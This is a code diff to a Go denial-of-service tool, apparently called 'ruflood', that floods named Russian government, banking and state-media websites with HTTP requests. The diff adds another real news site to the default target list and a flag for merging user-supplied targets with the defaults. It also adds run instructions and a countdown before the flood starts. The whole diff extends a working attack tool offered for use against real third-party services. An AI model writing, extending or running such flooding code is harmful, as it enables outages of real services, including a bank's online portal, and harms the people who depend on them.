@@ -10,6 +10,7 @@ import (
 	"os/exec"
 	"os/signal"
 	"runtime"
+	"sort"
 	"strconv"
 	"sync"
 	"time"
@@ -59,7 +60,8 @@ var defaultTargets = []string{
 	"https://www.vesti.ru/",
 	"https://sberbank.ru/", // biggest russian bank
 	"https://online.sberbank.ru/",
-	"https://rkn.gov.ru/", // state bureau for media oversight
+	"https://rkn.gov.ru/",      // state bureau for media oversight
+	"https://sputniknews.com/", // state-owned news agency
 }
 
 func main() {
@@ -76,11 +78,24 @@ func main() {
 			fmt.Printf("         %v\n", target)
 		}
 	}
-	fmt.Println("Russian warship, go fuck yourself in 5 s.")
+	fmt.Println("You can stop the program ANYTIME by hitting Ctrl+C in the command line/terminal this program is running in.")
+	fmt.Println()
+	fmt.Println("The websites listed above will be flooded. If you want to modify the list, run the program with wanted websites appended at the end, e.g.")
+	fmt.Println()
+	fmt.Println("    ruflood-windows-amd64.exe https://first.website.ru http://second.website.ru")
+	fmt.Println()
+	fmt.Println("or, if you just want to add to the default list of websites, use the -a or --add-to-default-targets argument, e.g. like this")
+	fmt.Println()
+	fmt.Println("    ruflood-windows-amd64.exe -a https://first.website.ru http://second.website.ru")
+	fmt.Println()
 
 	starter := make(chan struct{})
 	go func() {
-		time.Sleep(time.Second * 5)
+		for n := 10; n > 0; n-- {
+			fmt.Printf("\rRussian warship, go fuck yourself in %2d s", n)
+			time.Sleep(time.Second)
+		}
+		fmt.Println()
 		starter <- struct{}{}
 	}()
 
@@ -111,8 +126,11 @@ func ParseArgs() Config {
 		Targets:               []string{},
 	}
 
+	targets := map[string]struct{}{}
+
 	arg := ""
-	for _, argv := range os.Args[1:] {
+	for i := 1; i < len(os.Args); i++ {
+		argv := os.Args[i]
 		switch arg {
 		case "":
 			switch argv {
@@ -128,11 +146,17 @@ func ParseArgs() Config {
 				fallthrough
 			case "--print-interval":
 				arg = "i"
+			case "-a":
+				fallthrough
+			case "--add-to-default-targets":
+				for _, target := range defaultTargets {
+					targets[target] = struct{}{}
+				}
 			case "-h":
 				fallthrough
 			case "--help":
-				fmt.Printf("Usage: %s [-i | --print-interval i] [-c | --max-concurrent-requests c] [-r | --request-timeout r] [targets...]\n\n", os.Args[0])
-				fmt.Println("Floods russian state/bank/state-owned media websites with requests. The positional argument targets is a list of websites to flood. If unspecified, a default list will be used.")
+				fmt.Printf("Usage: %s [OPTIONS] [targets...]\n\n", os.Args[0])
+				fmt.Println("Floods russian state/bank/state-owned media websites with requests. The positional argument targets is a (whitespace separated) list of websites to flood. If unspecified, a default list will be used.")
 				fmt.Println()
 				fmt.Println("OPTIONS")
 				fmt.Println("-i | --print-interval i")
@@ -140,11 +164,16 @@ func ParseArgs() Config {
 				fmt.Println()
 				fmt.Println("-c | --max-concurrent-requests c")
 				fmt.Println("\tMaximum number of concurrently running requests. Must be > 0. Default is 1000.")
+				fmt.Println()
 				fmt.Println("-r | --request-timeout r")
 				fmt.Println("\tTimeout for an individual request, in milliseconds. 0 (zero) makes requests without timeout (i.e. they will wait for response indefinitely). Default is 1000.")
+				fmt.Println()
+				fmt.Println("-a | --add-to-default-targets")
+				fmt.Println("\tIf specified, targets passed to the program will be added to the defaults, instead of replacing them. Duplicates will be removed.")
 				os.Exit(0)
 			default:
 				arg = "t"
+				i--
 			}
 		case "c":
 			v, err := strconv.Atoi(argv)
@@ -177,7 +206,7 @@ func ParseArgs() Config {
 			cfg.PrintInterval = time.Millisecond * time.Duration(v)
 			arg = ""
 		case "t":
-			cfg.Targets = append(cfg.Targets, argv)
+			targets[argv] = struct{}{}
 		}
 	}
 
@@ -190,9 +219,16 @@ func ParseArgs() Config {
 		panic("no value provided for -r | --request-timeout")
 	}
 
+	for target := range targets {
+		cfg.Targets = append(cfg.Targets, target)
+	}
+
 	if len(cfg.Targets) == 0 {
 		cfg.Targets = defaultTargets
 	}
+
+	sort.Strings(cfg.Targets)
+
 	return cfg
 }
 
